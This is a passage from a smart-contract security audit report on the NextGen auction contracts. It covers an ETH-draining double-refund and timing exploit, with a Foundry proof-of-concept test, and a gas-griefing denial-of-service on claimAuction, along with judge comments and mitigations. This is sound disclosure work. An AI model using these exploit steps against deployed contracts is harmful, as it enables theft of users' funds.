[2](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1749)), immeas ([1](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1716), [2](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1702)), [oakcobalt](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1677), [phoenixV110](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1654), jasonxiale ([1](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1636), [2](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1628), [3](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1623)), [Silvermist](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1582), [xeros](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1547), btk ([1](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1521), [2](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1513), [3](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1507)), sl1 ([1](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1515), [2](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1313)), [Toshii](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1468), [3th](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1443), [Haipls](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1374), [mahyar](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1373), [DarkTower](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1370), [Talfao](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1369), [r0ck3tz](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1356), [dethera](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1337), AvantGard ([1](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1322), [2](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1321)), Neon2835 ([1](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1280), [2](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1249)), [seeques](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1262), [Zach\_166](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1261), [Fulum](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1252), Arabadzhiev ([1](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1251), [2](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1092)), Eigenvectors ([1](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1241), [2](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1240), [3](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1239)), 00xSEV ([1](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1215), [2](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1212), [3](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1210), [4](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1208)), [nuthan2x](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1205), zhaojie ([1](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1180), [2](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1172)), lsaudit ([1](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1155), [2](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1152)), audityourcontracts ([1](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1130), [2](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1129)), [Al-Qa-qa](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1099), [bird-flu](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1093), [MrPotatoMagic](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1077), [Delvir0](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1072), [bronze\_pickaxe](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1063), [xuwinnie](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1059), [0xMAKEOUTHILL](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1043), [PENGUN](https://github.com/code-423n4/2023-10-nextgen-findings/issues/991), [rotcivegaf](https://github.com/code-423n4/2023-10-nextgen-findings/issues/977), droptpackets ([1](https://github.com/code-423n4/2023-10-nextgen-findings/issues/975), [2](https://github.com/code-423n4/2023-10-nextgen-findings/issues/934)), [Greed](https://github.com/code-423n4/2023-10-nextgen-findings/issues/954), [0xDetermination](https://github.com/code-423n4/2023-10-nextgen-findings/issues/915), [fibonacci](https://github.com/code-423n4/2023-10-nextgen-findings/issues/911), [gumgumzum](https://github.com/code-423n4/2023-10-nextgen-findings/issues/880), [cartlex\_](https://github.com/code-423n4/2023-10-nextgen-findings/issues/802), ChrisTina ([1](https://github.com/code-423n4/2023-10-nextgen-findings/issues/792), [2](https://github.com/code-423n4/2023-10-nextgen-findings/issues/791)), [Kow](https://github.com/code-423n4/2023-10-nextgen-findings/issues/790), [ke1caM](https://github.com/code-423n4/2023-10-nextgen-findings/issues/754), The\_Kakers ([1](https://github.com/code-423n4/2023-10-nextgen-findings/issues/735), [2](https://github.com/code-423n4/2023-10-nextgen-findings/issues/733)), 0xAsen ([1](https://github.com/code-423n4/2023-10-nextgen-findings/issues/679), [2](https://github.com/code-423n4/2023-10-nextgen-findings/issues/183)), [aslanbek](https://github.com/code-423n4/2023-10-nextgen-findings/issues/665), [Jorgect](https://github.com/code-423n4/2023-10-nextgen-findings/issues/627), [0xJuda](https://github.com/code-423n4/2023-10-nextgen-findings/issues/618), amaechieth ([1](https://github.com/code-423n4/2023-10-nextgen-findings/issues/567), [2](https://github.com/code-423n4/2023-10-nextgen-findings/issues/425)), xAriextz ([1](https://github.com/code-423n4/2023-10-nextgen-findings/issues/494), [2](https://github.com/code-423n4/2023-10-nextgen-findings/issues/490)), [Krace](https://github.com/code-423n4/2023-10-nextgen-findings/issues/483), [CaeraDenoir](https://github.com/code-423n4/2023-10-nextgen-findings/issues/463), [Ruhum](https://github.com/code-423n4/2023-10-nextgen-findings/issues/428), [darksnow](https://github.com/code-423n4/2023-10-nextgen-findings/issues/410), Draiakoo ([1](https://github.com/code-423n4/2023-10-nextgen-findings/issues/399), [2](https://github.com/code-423n4/2023-10-nextgen-findings/issues/145)), [\_eperezok](https://github.com/code-423n4/2023-10-nextgen-findings/issues/370), [0x180db](https://github.com/code-423n4/2023-10-nextgen-findings/issues/339), [degensec](https://github.com/code-423n4/2023-10-nextgen-findings/issues/330), [NoamYakov](https://github.com/code-423n4/2023-10-nextgen-findings/issues/305), [openwide](https://github.com/code-423n4/2023-10-nextgen-findings/issues/289), Zac ([1](https://github.com/code-423n4/2023-10-nextgen-findings/issues/274), [2](https://github.com/code-423n4/2023-10-nextgen-findings/issues/125)), [bdmcbri](https://github.com/code-423n4/2023-10-nextgen-findings/issues/241), [HChang26](https://github.com/code-423n4/2023-10-nextgen-findings/issues/169), [0x3b](https://github.com/code-423n4/2023-10-nextgen-findings/issues/66), [ABA](https://github.com/code-423n4/2023-10-nextgen-findings/issues/56), [epistkr](https://github.com/code-423n4/2023-10-nextgen-findings/issues/35), slvDev ([1](https://github.com/code-423n4/2023-10-nextgen-findings/issues/2029), [2](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1966)), [cryptothemex](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1994), [blutorque](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1918), [vangrim](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1896), [Kose](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1815), [0xSwahili](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1779), [tnquanghuy0512](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1770), [c0pp3rscr3w3r](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1680), [yobiz](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1616), [ast3ros](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1596), [shenwilly](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1583), [c3phas](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1561), [0xarno](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1540), [innertia](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1494), trachev ([1](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1430), [2](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1420)), [Oxsadeeq](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1268), [aldarion](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1250), [Norah](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1245), cu5t0mpeo ([1](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1110), [2](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1107)), [VAD37](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1081), [Vagner](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1050), [circlelooper](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1040), [alexfilippov314](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1028), [0xsagetony](https://github.com/code-423n4/2023-10-nextgen-findings/issues/999), [volodya](https://github.com/code-423n4/2023-10-nextgen-findings/issues/985), [ak1](https://github.com/code-423n4/2023-10-nextgen-findings/issues/981), 0x\_6a70 ([1](https://github.com/code-423n4/2023-10-nextgen-findings/issues/948), [2](https://github.com/code-423n4/2023-10-nextgen-findings/issues/938)), SpicyMeatball ([1](https://github.com/code-423n4/2023-10-nextgen-findings/issues/940), [2](https://github.com/code-423n4/2023-10-nextgen-findings/issues/898)), [MaNcHaSsS](https://github.com/code-423n4/2023-10-nextgen-findings/issues/924), 0x656c68616a ([1](https://github.com/code-423n4/2023-10-nextgen-findings/issues/862), [2](https://github.com/code-423n4/2023-10-nextgen-findings/issues/861)), [JohnnyTime](https://github.com/code-423n4/2023-10-nextgen-findings/issues/841), dimulski ([1](https://github.com/code-423n4/2023-10-nextgen-findings/issues/823), [2](https://github.com/code-423n4/2023-10-nextgen-findings/issues/789)), Inference ([1](https://github.com/code-423n4/2023-10-nextgen-findings/issues/819), [2](https://github.com/code-423n4/2023-10-nextgen-findings/issues/817), [3](https://github.com/code-423n4/2023-10-nextgen-findings/issues/810)), [lanrebayode77](https://github.com/code-423n4/2023-10-nextgen-findings/issues/777), [crunch](https://github.com/code-423n4/2023-10-nextgen-findings/issues/774), [TermoHash](https://github.com/code-423n4/2023-10-nextgen-findings/issues/762), t0x1c ([1](https://github.com/code-423n4/2023-10-nextgen-findings/issues/730), [2](https://github.com/code-423n4/2023-10-nextgen-findings/issues/725), [3](https://github.com/code-423n4/2023-10-nextgen-findings/issues/692)), [ayden](https://github.com/code-423n4/2023-10-nextgen-findings/issues/716), Soul22 ([1](https://github.com/code-423n4/2023-10-nextgen-findings/issues/655), [2](https://github.com/code-423n4/2023-10-nextgen-findings/issues/650)), [0xpiken](https://github.com/code-423n4/2023-10-nextgen-findings/issues/533), tallo ([1](https://github.com/code-423n4/2023-10-nextgen-findings/issues/421), [2](https://github.com/code-423n4/2023-10-nextgen-findings/issues/413)), [tpiliposian](https://github.com/code-423n4/2023-10-nextgen-findings/issues/403), [orion](https://github.com/code-423n4/2023-10-nextgen-findings/issues/328), [REKCAH](https://github.com/code-423n4/2023-10-nextgen-findings/issues/318), [DanielArmstrong](https://github.com/code-423n4/2023-10-nextgen-findings/issues/315), cccz ([1](https://github.com/code-423n4/2023-10-nextgen-findings/issues/210), [2](https://github.com/code-423n4/2023-10-nextgen-findings/issues/209)), [Shubham](https://github.com/code-423n4/2023-10-nextgen-findings/issues/190), [8olidity](https://github.com/code-423n4/2023-10-nextgen-findings/issues/171), [ZdravkoHr](https://github.com/code-423n4/2023-10-nextgen-findings/issues/153), [evmboi32](https://github.com/code-423n4/2023-10-nextgen-findings/issues/148), [max10afternoon](https://github.com/code-423n4/2023-10-nextgen-findings/issues/53), 0xAadi ([1](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1910), [2](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1867)), [pontifex](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1797), [kimchi](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1612), [0xMosh](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1413), [SovaSlava](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1379), [joesan](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1263), Jiamin ([1](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1197), [2](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1195)), [Kaysoft](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1146), [00decree](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1011), [Hama](https://github.com/code-423n4/2023-10-nextgen-findings/issues/848), [mrudenko](https://github.com/code-423n4/2023-10-nextgen-findings/issues/701), [twcctop](https://github.com/code-423n4/2023-10-nextgen-findings/issues/680), [Deft\_TT](https://github.com/code-423n4/2023-10-nextgen-findings/issues/652), Juntao ([1](https://github.com/code-423n4/2023-10-nextgen-findings/issues/635), [2](https://github.com/code-423n4/2023-10-nextgen-findings/issues/630)), [0xAleko](https://github.com/code-423n4/2023-10-nextgen-findings/issues/433), [y4y](https://github.com/code-423n4/2023-10-nextgen-findings/issues/391), [AerialRaider](https://github.com/code-423n4/2023-10-nextgen-findings/issues/281), and [rvierdiiev](https://github.com/code-423n4/2023-10-nextgen-findings/issues/65)*

It’s possible to drain all ETH from the `AuctionDemo` contract. There are two bugs that make it possible when they're exploited together.

### First bug:

In `AuctionDemo` there are two phases of an auction:

1. Before `minter.getAuctionEndTime(_tokenid)`, when users can call `participateToAuction` and `cancelBid` functions.
2. After `minter.getAuctionEndTime(_tokenid)`, when the winner can call `claimAuction`.

However, `=<` and `>=` inequalities are used in all checks ([1](https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/smart-contracts/AuctionDemo.sol#L105), [2](https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/smart-contracts/AuctionDemo.sol#L125), [3](https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/smart-contracts/AuctionDemo.sol#L58)). Therefore, if `block.timestamp == minter.getAuctionEndTime(_tokenid)`, then both phases are active at the same time and the winner of an auction can call all of these functions in the same transaction.

On Ethereum blockchain, one block is produced every `12` seconds. Therefore, for each auction there’s `1/12` probability that `minter.getAuctionEndTime(_tokenid)` will be exactly equal to `block.timestamp` for some block (assuming that `minter.getAuctionEndTime(_tokenid) % 12` is uniformly random).

### Second bug:

In `cancelBid` function, `auctionInfoData[_tokenid][index].status` is set to `false` when a user gets a [refund](https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/smart-contracts/AuctionDemo.sol#L127). This is to prevent getting a refund on the same bid multiple times.

However, there is no such protection in `claimAuction` when [refunding](https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/smart-contracts/AuctionDemo.sol#L116) all non-winning bids.

### Exploit

These two bugs exploited together allow an attacker to quickly become the winner for an auction when `minter.getAuctionEndTime(_tokenid) == block.timestamp`, then places an additional bid, and then gets refunded on these bids by canceling them.

The refund on the winning bid causes the winner to get the auctioned NFT for free.

Refunding on the additional bid allows the attacker to drain the contract because they get back twice the deposited amount of ETH (one refund from `claimAuction` and one from `cancelBid`, both for the same bid).

### Impact

Attacker can “win“ an NFT from an auction and steal all ETH deposited for other auctions that are running at the time of the attack.

Condition that enables the attack is that `minter.getAuctionEndTime(_tokenid) == block.timestamp` for some block and for some `_tokenid`.

Let’s assume that:

1. `minter.getAuctionEndTime(_tokenid) % 12` is a uniformly distributed random variable (all `12` possible values have the same probability `1/12`).
2. One block is produced every `12` seconds.
3. There were `100` auctions running in `AuctionDemo` (only some of them have to overlap in time).

Under these assumptions, probability of `minter.getAuctionEndTime(_tokenid) == block.timestamp`  occurring is `1 - (11/12)^100 ~= 0.99983`. So it’s nearly guaranteed to happen.

### Proof of Concept

Exact steps and full code to reproduce the exploit are [in this secret gist](https://gist.github.com/SmilingHeretic/cdef686367874824040b912f14a58470).

Here is the test with main logic of the exploit:

```solidity
    function testExploit() public {
        // get id of of 1st auctioned token
        uint256 tokenId = gencore.viewTokensIndexMin(collectionId);

        // check initial state
        assertEq(gencore.ownerOf(tokenId), nftOwner);
        assertEq(attacker.balance, 5 ether);
        assertEq(honestUser.balance, 5 ether);
        assertEq(address(auction).balance, 0);
        assertEq(auctionOwner.balance, 0);

        // required approval so that claimAuction won't revert
        vm.prank(nftOwner);
        gencore.approve(address(auction), tokenId);

        // honest user participates in two auctions
        vm.startPrank(honestUser);
        auction.participateToAuction{value: 1 ether}(tokenId);
        auction.participateToAuction{value: 3.06 ether}(tokenId + 1);
        vm.stopPrank();

        // attacker waits until block.timestamp == auctionEndTime
        vm.warp(minter.getAuctionEndTime(tokenId));

        // exploit
        vm.startPrank(attacker);
        // attacker places three bids and becomes the winner of the auction
        auction.participateToAuction{value: 1.01 ether}(tokenId);
        auction.participateToAuction{value: 1.02 ether}(tokenId);
        auction.participateToAuction{value: 1.03 ether}(tokenId);

        // attacker claims the auctioned NFT
        // and receives refunds on their two non-winning bids
        auction.claimAuction(tokenId);

        // attacker gets refunds on all three bids
        auction.cancelAllBids(tokenId);
        vm.stopPrank();

        // check final state
        assertEq(gencore.ownerOf(tokenId), attacker);
        assertEq(attacker.balance, 7.03 ether);
        assertEq(honestUser.balance, 5 ether - 3.06 ether);
        assertEq(address(auction).balance, 0);
        assertEq(auctionOwner.balance, 1.03 ether);
    }
```

### Tools Used

Foundry

### Recommended Mitigation Steps

Use strict inequality (`>` instead of `>=`) in `claimAuction` to exclude the exact `minter.getAuctionEndTime(_tokenid)` from 2nd phase of the auction.

Set `auctionInfoData[_tokenid][index].status = false` in `claimAuction` before sending refunds (just like in `cancelBid`) to protect against double refunds.

### Assessed type

Timing

**[0xsomeone (judge) commented](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1323#issuecomment-1839275218):**
 > The Warden has illustrated that it is possible to exploit a time-based overlap between the claim of an auction and the cancellation of a bid to siphon funds from the NextGen system.
> 
> In contrast to [#175](https://github.com/code-423n4/2023-10-nextgen-findings/issues/175) which is based on a similar time overlap albeit in different functions, I deem it to be better suited as a "major" severity issue given that its likelihood is low but its impact is "critical", permitting up to the full auction amount to be stolen thereby tapping into funds of other users.
> 
> The Warden's submission was selected as best because it clearly outlines the issue (it is possible to siphon all funds and not just claim the NFT for free), marks the timestamp caveat which limits the vulnerability's exploitability, and provides a short-and-sweet PoC illustrating the problem.

**[0xsomeone (judge) commented](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1323#issuecomment-1839523352):**
 > I initially planned to split cancel-after-bid submissions between re-entrancies and back-running attacks; however, both rely on the same core issue and as such will be merged under this exhibit given that back-running has "primacy" over re-entrancies (i.e. fixing a re-entrancy doesn't mean back-running is fixed, however, the opposite is true).

**[0xsomeone (judge) commented](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1323#issuecomment-1845207639):**
 > Findings relating to the cancellation of a bid and immediate claim at a low price have been grouped under this finding as concerning the same root cause. For more information, [consult the relevant response in the original primary exhibit](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1513#issuecomment-1845203182).

**[a2rocket (NextGen) confirmed](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1323#issuecomment-1876732472)**

***

## [[H-03] Adversary can block `claimAuction()` due to push-strategy to transfer assets to multiple bidders](https://github.com/code-423n4/2023-10-nextgen-findings/issues/734)
*Submitted by [The\_Kakers](https://github.com/code-423n4/2023-10-nextgen-findings/issues/734), also found by btk ([1](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1826), [2](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1508)), [TuringConsulting](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1782), [immeas](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1703), [yojeff](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1647), [DeFiHackLabs](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1584), [audityourcontracts](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1491), [Toshii](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1467), [DarkTower](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1357), [CSL](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1288), [codynhat](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1145), [lsaudit](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1141), [trachev](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1125), [Vagner](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1044), [Greed](https://github.com/code-423n4/2023-10-nextgen-findings/issues/966), [0xDetermination](https://github.com/code-423n4/2023-10-nextgen-findings/issues/913), [gumgumzum](https://github.com/code-423n4/2023-10-nextgen-findings/issues/843), [lanrebayode77](https://github.com/code-423n4/2023-10-nextgen-findings/issues/805), [0xJuda](https://github.com/code-423n4/2023-10-nextgen-findings/issues/761), [ke1caM](https://github.com/code-423n4/2023-10-nextgen-findings/issues/755), [Al-Qa-qa](https://github.com/code-423n4/2023-10-nextgen-findings/issues/599), [Valix](https://github.com/code-423n4/2023-10-nextgen-findings/issues/529), [NentoR](https://github.com/code-423n4/2023-10-nextgen-findings/issues/502), [glcanvas](https://github.com/code-423n4/2023-10-nextgen-findings/issues/495), [CaeraDenoir](https://github.com/code-423n4/2023-10-nextgen-findings/issues/481), [MaNcHaSsS](https://github.com/code-423n4/2023-10-nextgen-findings/issues/439), [NoamYakov](https://github.com/code-423n4/2023-10-nextgen-findings/issues/358), [0xAsen](https://github.com/code-423n4/2023-10-nextgen-findings/issues/193), [mrudenko](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1734), [innertia](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1500), [SovaSlava](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1382), [Talfao](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1375), [r0ck3tz](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1344), [0xlemon](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1339), [00xSEV](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1213), [0xhunter](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1106), [VAD37](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1080), [Arabadzhiev](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1029), [PENGUN](https://github.com/code-423n4/2023-10-nextgen-findings/issues/992), [niki](https://github.com/code-423n4/2023-10-nextgen-findings/issues/969), [nmirchev8](https://github.com/code-423n4/2023-10-nextgen-findings/issues/899), [flacko](https://github.com/code-423n4/2023-10-nextgen-findings/issues/715), [Soul22](https://github.com/code-423n4/2023-10-nextgen-findings/issues/653), [ZdravkoHr](https://github.com/code-423n4/2023-10-nextgen-findings/issues/601), [0xpiken](https://github.com/code-423n4/2023-10-nextgen-findings/issues/536), [funkornaut](https://github.com/code-423n4/2023-10-nextgen-findings/issues/507), [Ruhum](https://github.com/code-423n4/2023-10-nextgen-findings/issues/466), [0xWaitress](https://github.com/code-423n4/2023-10-nextgen-findings/issues/440), [Viktor\_Cortess](https://github.com/code-423n4/2023-10-nextgen-findings/issues/361), [openwide](https://github.com/code-423n4/2023-10-nextgen-findings/issues/293), [oualidpro](https://github.com/code-423n4/2023-10-nextgen-findings/issues/85), [rvierdiiev](https://github.com/code-423n4/2023-10-nextgen-findings/issues/64), and [Haipls](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1381)*

`claimAuction()` implements a push-strategy instead of a pull-strategy for returning the bidders funds.

This gives the opportunity for an adversary to DOS the function, locking all funds from other participants.

This finding differs from the automated findings report [M-01](https://github.com/code-423n4/2023-10-nextgen/blob/main/bot-report.md#m-01-unchecked-return-value-of-low-level-calldelegatecall), and [L-18](https://github.com/code-423n4/2023-10-nextgen/blob/main/bot-report.md#l-18-gas-griefingtheft-is-possible-on-an-unsafe-external-call), as it has a different root cause, can't be prevented with any of the mitigations from the bot, and also highlights the actual High impact of the issue.

### Impact

- Prevents other bidders from receiving their bids back.
- Prevents the token owner from receiving earnings.
- Prevents the bidder winner from receiving the NFT.

All Ether from the auction can be lost as there is no alternate way of recovering it.

This also breaks one of the [main invariants of the protocol](https://github.com/code-423n4/2023-10-nextgen#main-invariants):

> Properties that should NEVER be broken under any circumstance:
>
> -   **The highest bidder will receive the token after an auction finishes**, **the owner of the token will receive the funds** and **all other participants will get refunded**.

### Proof of Concept

An adversary can create bids for as little as 1 wei, as there is no minimum limitation: [AuctionDemo.sol#L58](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/AuctionDemo.sol#L58). With that, it can participate in as many auctions as they want to grief all auctions.

All non-winning bidders that didn't cancel their bid before the auction ended will receive their bids back during `claimAuction()`:

```solidity
    function claimAuction(uint256 _tokenid) public WinnerOrAdminRequired(_tokenid,this.claimAuction.selector){
        /// ...
->      for (uint256 i=0; i< auctionInfoData[_tokenid].length; i ++) {
            if (auctionInfoData[_tokenid][i].bidder == highestBidder && auctionInfoData[_tokenid][i].bid == highestBid && auctionInfoData[_tokenid][i].status == true) {
                IERC721(gencore).safeTransferFrom(ownerOfToken, highestBidder, _tokenid);
                (bool success, ) = payable(owner()).call{value: highestBid}("");
                emit ClaimAuction(owner(), _tokenid, success, highestBid);
            } else if (auctionInfoData[_tokenid][i].status == true) {
->              (bool success, ) = payable(auctionInfoData[_tokenid][i].bidder).call{value: auctionInfoData[_tokenid][i].bid}("");
                emit Refund(auctionInfoData[_tokenid][i].bidder, _tokenid, success, highestBid);
            } else {}
        }
    }
```

[AuctionDemo.sol#L116](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/AuctionDemo.sol#L116)

The contracts call the bidders with some `value`. If the receiver is a contract, it can execute arbitrary code. A malicious bidder can exploit this to make the `claimAuction()` always revert, and so no funds to other participants be paid back.

With the current implementation, a gas bomb can be implemented to perform the attack. [L-18](https://github.com/code-423n4/2023-10-nextgen/blob/main/bot-report.md#l-18-gas-griefingtheft-is-possible-on-an-unsafe-external-call) 
 from the automated findings report suggests the use of `excessivelySafeCall()` to prevent it, but it limits the functionality of legit contract receivers, and eventually preventing them from receiving the funds. In addition, the finding doesn't showcase the High severity of the issue and may be neglected.

[M-01](https://github.com/code-423n4/2023-10-nextgen/blob/main/bot-report.md#m-01-unchecked-return-value-of-low-level-calldelegatecall) from the automated findings report points out the lack of a check of the `success` of the calls. If the function reverts when the call was not successful, the adversary can make a callback on its contract `receive()` function to always revert to perform this same attack. In addition, this finding also doesn't showcase the High severity of the issue.

Ultimately the way to prevent this attack is to separate the transfer of each individual bidder to a separate function.

### Recommended Mitigation Steps

Create a separate function for each bidder to claim their funds back (such as the cancel bids functions are implemented).

### Assessed type

ETH-Transfer

**[a2rocket (NextGen) acknowledged and commented via duplicate issue #1703](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1703#issuecomment-1825374235):**
> There are several ways to do this; we will introduce an additional `claimingFunction`.

**[0xsomeone (judge) commented](https://github.com/code-423n4/2023-10-nextgen-findings/issues/734#issuecomment-1839381558):**
 > The Warden specifies a way in which an auction can be sabotaged entirely in its claim operation by gas griefing.
> 
> While the finding has been identified as [L-18](https://github.com/code-423n4/2023-10-nextgen/blob/main/bot-report.md#l-18-gas-griefingtheft-is-possible-on-an-unsafe-external-call) in the automated findings report, it may indeed be neglected and inadequately encompasses the severity of this flaw. 
> 
> As the Warden clearly illustrates, all funds in the auction will be permanently lost and in an easily accessible fashion by simply either consuming all gas in meaningless operations or gas-bombing via an arbitrarily large payload being returned.
> 
> This particular submission was selected as best-for-report due to its acknowledgment of automated findings issues, precisely & correctly specifying the impact of the exhibit, and providing a PoC that demonstrates the problem.
> 
> The C4 Supreme Court verdict [did not finalize on issues based entirely on automated findings](https://docs.google.com/document/d/1Y2wJVt0d2URv8Pptmo7JqNd0DuPk_qF9EPJAj3iSQiE/edit#heading=h.vljs3xbfn8cj) and as such, I will deem this exhibit a valid high submission given its accessibility and 2-tier upgrade from the automated findings report (`L` to `H`).

***

## [[H-04] Multiple mints can brick any form of `salesOption` 3 mintings](https://github.com/code-423n4/2023-10-nextgen-findings/issues/380)
*Submitted by [0x3b](https://github.com/code-423n4/2023-10-nextgen-findings/issues/380), also found by [AvantGard](https://github.com/code-423n4/2023-10-nextgen-findings/issues/2012), [MrPotatoMagic](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1123), Krace ([1](https://github.com/code-423n4/2023-10-nextgen-findings/issues/632), [2](https://github.com/code-423n4/2023-10-nextgen-findings/issues/631)), [ZdravkoHr](https://github.com/code-423n4/2023-10-nextgen-findings/issues/89), [0xlemon](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1981), [fibonacci](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1821), [nuthan2x](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1553), [trachev](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1474), [oakcobalt](https://github.com/code-423n4/2023-10-nextgen-findings/issues/939), and [Noro](https://github.com/code-423n4/2023-10-nextgen-findings/issues/881)*

As explained by the sponsor, some collections might want to conduct multiple mints on different days. However, due to the way `salesOption` 3 works, these multiple mints might encounter issues.

### Proof of Concept

A collection has completed its first mint, where it minted 500 NFTs. However, the collection consists of 1000 NFTs, so the owner plans to schedule another mint, this time using sales option 3.

| Values               | Time                         |
| -------------------- | ------------------------ |
| `allowlistStartTime` | 4 PM                     |
| `allowlistEndTime`   | 7 PM                     |
| `publicStartTime`    | 7 PM                     |
| `publicEndTime`      | 1 day after public start |
| `timePeriod`         | 1 min                    |

